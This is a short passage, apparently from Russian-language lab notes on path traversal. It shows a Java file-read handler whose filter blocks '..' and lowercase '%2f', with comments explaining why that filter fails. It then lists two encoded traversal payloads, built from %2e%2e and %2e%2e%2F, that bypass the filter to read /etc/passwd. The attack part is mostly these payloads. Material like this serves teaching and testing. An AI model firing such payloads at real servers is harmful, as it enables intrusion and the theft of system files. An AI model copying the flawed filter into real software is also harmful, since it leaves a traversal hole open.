## EXAMPLE 5:
String fileName = queryParams.get(URL_PARAM_KEY);
        return this.readFile(
                () ->
                        !requestEntity.getUrl().toString().contains("..") // последовательность ".." => %2e%2e
                                && !requestEntity.getUrl().toString().contains("%2f") // чувствительность регистра не проверяется.
                                && fileName != null,
                fileName);
Обход:
1) %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
2) %2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2Fpasswd
